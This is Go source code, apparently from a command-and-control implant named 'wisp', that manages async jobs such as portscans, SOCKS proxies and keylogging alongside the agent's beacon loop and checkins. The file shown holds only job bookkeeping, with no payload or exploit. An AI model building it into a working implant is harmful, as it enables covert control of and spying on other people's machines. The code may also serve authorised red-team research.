package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"github.com/user/wisp/shared/protocol"
)

// job is a long-running async task (portscan, socks, keylog...). Jobs run in
// their own goroutine and stream output back through queueBlocks on later
// checkins, so a slow job never blocks the agent's beacon loop.
type job struct {
	ID     string    `json:"id"`
	Kind   string    `json:"kind"`
	Start  time.Time `json:"start"`
	cancel context.CancelFunc
	done   chan struct{}
}

// jobView is the JSON snapshot sent to the server for CmdJobList.
type jobView struct {
	ID        string `json:"id"`
	Kind      string `json:"kind"`
	Started   string `json:"started"`
	Completed bool   `json:"completed"`
}

// startJob registers a job and launches its goroutine. The run function returns
// the final result text, which is queued with status "completed" against the
// original task id so the server marks the task done.
func (d *Dispatcher) startJob(kind string, task *Task, run func(ctx context.Context) []Result) *Result {
	ctx, cancel := context.WithCancel(context.Background())
	id := fmt.Sprintf("job-%d", time.Now().UnixNano())

	d.jobsMu.Lock()
	j := &job{ID: id, Kind: kind, Start: time.Now(), cancel: cancel, done: make(chan struct{})}
	d.jobs[id] = j
	d.jobsMu.Unlock()

	go func(j *job) {
		defer close(j.done)
		results := run(ctx)
		d.jobsMu.Lock()
		delete(d.jobs, id)
		d.jobsMu.Unlock()
		// Stream the produced output on the next checkin.
		if len(results) > 0 {
			d.queueBlocks(results)
		}
	}(j)

	// The immediate reply tells the operator the job started.
	return d.finish(task, fmt.Sprintf("job %s started (%s)", id, kind), "")
}

// queueJobOutput streams one output line for a job task without completing it.
func (d *Dispatcher) queueJobOutput(taskID, line string) {
	d.queueBlocks([]Result{{TaskID: taskID, Output: line, Status: protocol.TaskJobOutput}})
}

// finishJob completes a job task with its final output.
func (d *Dispatcher) finishJob(taskID, output string) {
	d.queueBlocks([]Result{{TaskID: taskID, Output: output, Status: protocol.TaskCompleted}})
}

// execJobListCmd lists the running async jobs.
func (d *Dispatcher) execJobListCmd(_ *Dispatcher, task *Task) *Result {
	d.jobsMu.Lock()
	views := make([]jobView, 0, len(d.jobs))
	for _, j := range d.jobs {
		views = append(views, jobView{
			ID:        j.ID,
			Kind:      j.Kind,
			Started:   j.Start.Format("2006-01-02 15:04:05"),
			Completed: false,
		})
	}
	d.jobsMu.Unlock()
	out, _ := json.MarshalIndent(views, "", "  ")
	return d.finish(task, string(out), "")
}

// execJobKillCmd cancels a running job.
func (d *Dispatcher) execJobKillCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		ID string `json:"id"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	if args.ID == "" {
		return d.finish(task, "error: job id is required", "failed")
	}
	d.jobsMu.Lock()
	j, ok := d.jobs[args.ID]
	d.jobsMu.Unlock()
	if !ok {
		return d.finish(task, "error: unknown job "+args.ID, "failed")
	}
	j.cancel()
	return d.finish(task, "job "+args.ID+" cancelled", "")
}
